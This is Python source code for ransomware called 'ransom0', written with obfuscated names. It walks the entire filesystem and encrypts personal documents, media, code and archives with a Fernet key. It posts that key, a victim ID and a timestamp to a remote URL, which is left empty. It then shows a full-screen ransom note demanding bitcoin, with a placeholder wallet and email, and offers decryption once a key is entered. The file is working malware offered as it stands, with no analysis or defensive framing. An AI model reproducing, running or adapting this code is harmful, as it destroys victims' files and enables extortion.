import os 
import platform 
import ssl 
import shutil 
import time 
import requests 
import ctypes 
import subprocess 
from datetime import datetime 
from os import name ,path 
from cryptography .fernet import Fernet 
import tkinter as tk 
from tkinter import *
from random import randint 
digits =randint (1111 ,9999 )
key =Fernet .generate_key ()
url =''
class ransom0 :
    username =os .getlogin ()
    PATH =os .getcwd ()
    EXCLUDE_DIRECTORY =('/usr','/Library/','/System','/Applications','.Trash','Program Files','Program Files (x86)','Windows','$Recycle.Bin','AppData','logs',)
    EXTENSIONS =('.jpg','.jpeg','.bmp','.gif','.png','.svg','.psd','.raw','.mp3','.mp4','.m4a','.aac','.ogg','.flac','.wav','.wma','.aiff','.ape','.avi','.flv','.m4v','.mkv','.mov','.mpg','.mpeg','.wmv','.swf','.3gp','.doc','.docx','.xls','.xlsx','.ppt','.pptx','.odt','.odp','.ods','.txt','.rtf','.tex','.pdf','.epub','.md','.txt','.yml','.yaml','.json','.xml','.csv','.db','.sql','.dbf','.mdb','.iso','.html','.htm','.xhtml','.php','.asp','.aspx','.js','.jsp','.css','.c','.cpp','.cxx','.h','.hpp','.hxx','.java','.class','.jar','.ps','.bat','.vb','.vbs' '.awk','.sh','.cgi','.pl','.ada','.swift','.go','.py','.pyc','.bf','.coffee','.zip','.tar','.tgz','.bz2','.7z','.rar','.bak',)
    def clear (O00000O0O00OOO0O0 ):
        subprocess .call ('cls'if os .name =='nt'else 'clear',shell =False )
        os .system ('cls'if os .name =='nt'else 'clear')
    def FindFiles (OO000O000O0O0O0O0 ):
        OOOO0O000O0OO0O00 =open ("logs/path.txt","w")
        O0OO00OO0O0O000OO =0 
        for OO00OOO0O0000O0O0 ,O00O000000O0000OO ,OO0O00OO00OO0OOOO in os .walk ("/"):
            if any (O0O0OO00O0OO00OO0 in OO00OOO0O0000O0O0 for O0O0OO00O0OO00OO0 in OO000O000O0O0O0O0 .EXCLUDE_DIRECTORY ):
                pass 
            else :
                for OOOO00000OO0OOO00 in OO0O00OO00OO0OOOO :
                     if OOOO00000OO0OOO00 .endswith (OO000O000O0O0O0O0 .EXTENSIONS ):
                        OO00O000O00O0O00O =os .path .join (OO00OOO0O0000O0O0 ,OOOO00000OO0OOO00 )
                        OOOO0O000O0OO0O00 .write (OO00O000O00O0O00O +'\n')
                        print (OO00OOO0O0000O0O0 )
        OOOO0O000O0OO0O00 .close ()
        OOOO0O000O0OO0O00 =open ("logs/cnt.txt","w")
        OOOO0O000O0OO0O00 .write (str (O0OO00OO0O0O000OO ))
        OOOO0O000O0OO0O00 .close ()
    def Encrypt (OOOOOO00O0O0OO00O ,O000O0O00OOO000OO ):
        OOO000000O000000O =Fernet (key )
        with open (O000O0O00OOO000OO ,"rb")as O0O0O0000O00OOO0O :
            OOO00O0000O0OOOO0 =O0O0O0000O00OOO0O .read ()
        OO0OO000OOOOOO00O =OOO000000O000000O .encrypt (OOO00O0000O0OOOO0 )
        with open (O000O0O00OOO000OO ,"wb")as O0O0O0000O00OOO0O :
            O0O0O0000O00OOO0O .write (OO0OO000OOOOOO00O )
        print (O000O0O00OOO000OO )
def SendData (OO0O0O00OOOOO0000 ):
    O000O0OO0OOOO0OOO =datetime .now ()
    OOOOOO00OOOOOO0OO =O000O0OO0OOOO0OOO .strftime ("%d/%m/%Y %H:%M:%S")
    OO00OOOOOO00000OO =f'[{digits}, {key}, "{OOOOOO00OOOOOO0OO}", "{OO0O0O00OOOOO0000}"]'
    requests .post (url ,OO00OOOOOO00000OO )
ransom0 =ransom0 ()
def StartRansom ():
    try :
        ransom0 .FindFiles ()
        OO0O00OO0OO0000O0 ='logs/path.txt'
        with open (OO0O00OO0OO0000O0 )as O0O0OOO0OOOO0O0OO :
            OO0OOOO0O000OO0O0 =O0O0OOO0OOOO0O0OO .readline ()
            while OO0OOOO0O000OO0O0 :
                O0O0OO0000O00O0O0 =OO0OOOO0O000OO0O0 .strip ()
                try :
                    ransom0 .Encrypt (O0O0OO0000O00O0O0 )
                except Exception :
                    print ("!Permission denied")
                OO0OOOO0O000OO0O0 =O0O0OOO0OOOO0O0OO .readline ()
        O0O0OOO0OOOO0O0OO .close ()
        SendData ('false')
    except FileNotFoundError :
        os .mkdir ("logs")
        OOO00O00O00000000 =open ("logs/digits.txt","w")
        OOO00O00O00000000 .write (str (digits ))
        OOO00O00O00000000 .close ()
        StartRansom ()
StartRansom ()
PATH =os .getcwd ()
def DECRYPT_FILE ():
    OOOOO0OO00O0OOOOO =tk .Tk ()
    OOO000000000OO0O0 =OOOOO0OO00O0OOOOO .winfo_screenwidth ()
    OOO000OOO00O00O00 =OOOOO0OO00O0OOOOO .winfo_screenheight ()
    OO000OOOO0O000O0O =tk .Canvas (OOOOO0OO00O0OOOOO ,width =OOO000000000OO0O0 ,height =OOO000OOO00O00O00 ,bg ='black')
    OO000OOOO0O000O0O .pack ()
    OOOOO0OOOO00000OO =tk .Label (OOOOO0OO00O0OOOOO ,text ='YOUR FILES HAVE BEEN ENCRYPTED')
    OOOOO0OOOO00000OO .config (font =('helvetica',int (OOO000OOO00O00O00 /20 )))
    OOOOO0OOOO00000OO .config (background ='black',foreground ='red')
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /15 ),window =OOOOO0OOOO00000OO )
    OOOOO0OOOO00000OO =tk .Label (OOOOO0OO00O0OOOOO ,text ='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
    OOOOO0OOOO00000OO .config (font =('helvetica',int (OOO000OOO00O00O00 /50 )))
    OOOOO0OOOO00000OO .config (background ='black',foreground ='red')
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*8 ,window =OOOOO0OOOO00000OO )
    OOOOO0OOOO00000OO =tk .Label (OOOOO0OO00O0OOOOO ,text ='to decrypt them, send 50$ in bitcoin to BITCOIN_ADRESS, and them send proof of tranfer and your DIGITS to mail@mail.com')
    OOOOO0OOOO00000OO .config (font =('helvetica',int (OOO000OOO00O00O00 /50 )))
    OOOOO0OOOO00000OO .config (background ='black',foreground ='red')
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*9 ,window =OOOOO0OOOO00000OO )
    OOOOO0OOOO00000OO =tk .Label (OOOOO0OO00O0OOOOO ,text ='YOUR DIGITS IS {}'.format (digits ))
    OOOOO0OOOO00000OO .config (font =('helvetica',int (OOO000OOO00O00O00 /50 )))
    OOOOO0OOOO00000OO .config (background ='black',foreground ='red')
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*10 ,window =OOOOO0OOOO00000OO )
    OOOOO0OOOO00000OO =tk .Label (OOOOO0OO00O0OOOOO ,text ='KEY:')
    OOOOO0OOOO00000OO .config (font =('helvetica',int (OOO000OOO00O00O00 /50 )))
    OOOOO0OOOO00000OO .config (background ='black',foreground ='red')
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*11 ,window =OOOOO0OOOO00000OO )
    O0O000O0O0O0OO000 =tk .Entry (OOOOO0OO00O0OOOOO )
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*12 ,window =O0O000O0O0O0OO000 )
    def OO00O00O0OO0000OO ():
        def O00O0O000000O0OO0 (OO0O0OO0O00OO00O0 ):
            O000O0000OO00OO00 =O0O000O0O0O0OO000 .get ()
            OOOO00OO0OOO000OO =Fernet (O000O0000OO00OO00 )
            with open (OO0O0OO0O00OO00O0 ,"rb")as OOO0000OOO00O0000 :
                O00O0OOOOOO0OO0O0 =OOO0000OOO00O0000 .read ()
            O00O0OO000000OO0O =OOOO00OO0OOO000OO .decrypt (O00O0OOOOOO0OO0O0 )
            with open (OO0O0OO0O00OO00O0 ,"wb")as OOO0000OOO00O0000 :
                OOO0000OOO00O0000 .write (O00O0OO000000OO0O )
        with open ('logs/path.txt')as OOOO0OO000O0OO000 :
            O0000O0000O0OO00O =OOOO0OO000O0OO000 .readline ()
            while O0000O0000O0OO00O :
                O00O00O00OO00OO0O =O0000O0000O0OO00O .strip ()
                try :
                    O00O0O000000O0OO0 (O00O00O00OO00OO0O )
                except PermissionError :
                    print ("!Permission Denied")
                O0000O0000O0OO00O =OOOO0OO000O0OO000 .readline ()
        OO00OOO0000OO0OO0 =tk .Label (OOOOO0OO00O0OOOOO ,text ='YOUR FILES HAVE BEEN DECRYPTED')
        OO00OOO0000OO0OO0 .config (font =('helvetica',int (OOO000OOO00O00O00 /50 )))
        OO00OOO0000OO0OO0 .config (background ='black',foreground ='red')
        OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*15 ,window =OO00OOO0000OO0OO0 )
        OOOO0OO000O0OO000 .close ()
        shutil .rmtree (PATH +'/logs',ignore_errors =True )
        OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),340 ,window =OO00OOO0000OO0OO0 )
    O00O0OOO0OO0O0O0O =tk .Button (text ='Decrypt',command =OO00O00O0OO0000OO )
    O00O0OOO0OO0O0O0O .config (background ='red')
    OO000OOOO0O000O0O .create_window (int (OOO000000000OO0O0 /2 ),int (OOO000OOO00O00O00 /20 )*13 ,window =O00O0OOO0OO0O0O0O )
    OOOOO0OO00O0OOOOO .mainloop ()
    SendData ('true')
if __name__ =='__main__':
    if path .exists ("logs")is True :
        f =open ("logs/digits.txt","r")
        digits =f .read ()
        f .close ()
        DECRYPT_FILE ()
    else :
        os .mkdir ("logs")
        f =open ("logs/digits.txt","w")
        f .write (str (digits ))
        f .close ()
        StartRansom ()